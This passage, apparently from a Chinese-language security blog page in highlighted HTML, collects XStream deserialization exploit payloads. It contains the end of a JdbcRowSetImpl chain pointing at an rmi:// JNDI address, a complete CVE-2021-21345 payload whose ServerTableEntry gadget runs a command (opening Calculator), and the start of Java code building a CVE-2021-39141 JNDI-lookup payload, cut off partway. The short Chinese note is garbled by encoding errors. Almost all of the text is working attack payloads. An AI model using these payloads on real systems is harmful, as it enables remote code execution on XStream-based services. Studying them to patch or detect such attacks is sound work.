class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE_2021_21345"></a>CVE_2021_21345</h2><p>XStream&lt;&#x3D;1.4.15</p><p>æ‰“ä¸å‡ºç½‘ï¼Œåˆ©ç”¨ServerTableEntryæœ¬åœ°æ‰§è¡Œæ¶æ„ä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2021-39141"><a href="#CVE-2021-39141" class="headerlink" title="CVE-2021-39141"></a>CVE-2021-39141</h2><p>XStream&lt;&#x3D;1.4.17</p><p>JNDI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_1_4_17</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;owner/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;stubHandlers&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;name&gt;compareTo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;indices&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;int&gt;0&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/indices&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;getters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/getters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;accessors&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;type&gt;int&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;name&gt;hash&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/val_-getter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;val_-n&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;namespaceURI/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;localPart&gt;hash&lt;/localPart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;prefix/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/val_-n&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;type&gt;java.lang.String&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;name&gt;doLookup&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/val_-setter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;outer-class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;propertySetters&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;serialPersistentFields&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;name&gt;serialPersistentFields&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;/field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;java.util.Comparator&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;/field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;string&gt;serialVersionUID&lt;/string&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;type&gt;long&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;name&gt;serialVersionUID&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                              &lt;/field&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            